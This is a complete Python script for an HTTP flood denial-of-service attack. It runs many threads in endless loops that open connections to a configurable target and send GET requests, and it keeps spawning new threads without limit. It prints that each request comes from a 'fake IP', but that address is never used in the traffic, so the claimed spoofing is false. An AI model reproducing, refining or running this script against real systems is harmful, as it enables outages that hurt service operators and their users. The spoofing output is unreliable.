import socket
import threading
import time
import random
import os

class HTTPFlood:
    def __init__(self, target, port, base_fake_ip):
        self.target = target
        self.port = port
        self.base_fake_ip = base_fake_ip

    def generate_fake_ip(self):
        ip_parts = self.base_fake_ip.split('.')
        ip_parts[-1] = str(random.randint(1, 254))
        return '.'.join(ip_parts)

    def attack(self):
        while True:
            fake_ip = self.generate_fake_ip()
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((self.target, self.port))
                    request = f"GET / HTTP/1.1\r\nHost: {self.target}\r\n\r\n"
                    s.send(request.encode('ascii'))
                    print(f"Request sent from fake IP: {fake_ip}")
            except socket.error as e:
                print(f"Connection error: {e}")

    def start_attack(self, threads=5, delay=0.05):
        for _ in range(threads):
            thread = threading.Thread(target=self.attack)
            thread.daemon = True
            thread.start()
            time.sleep(delay)

if __name__ == "__main__":
    target_ip = os.environ.get('TARGET_IP', '192.168.2.22')
    port = int(os.environ.get('PORT', 80))
    threads = int(os.environ.get('THREADS', 10))
    
    # Extract base IP from target
    ip_parts = target_ip.split('.')
    fake_ip_base = '.'.join(ip_parts[:3]) + '.'

    ddos = HTTPFlood(target_ip, port, fake_ip_base)
    while True:
        ddos.start_attack(threads=threads, delay=0.001)
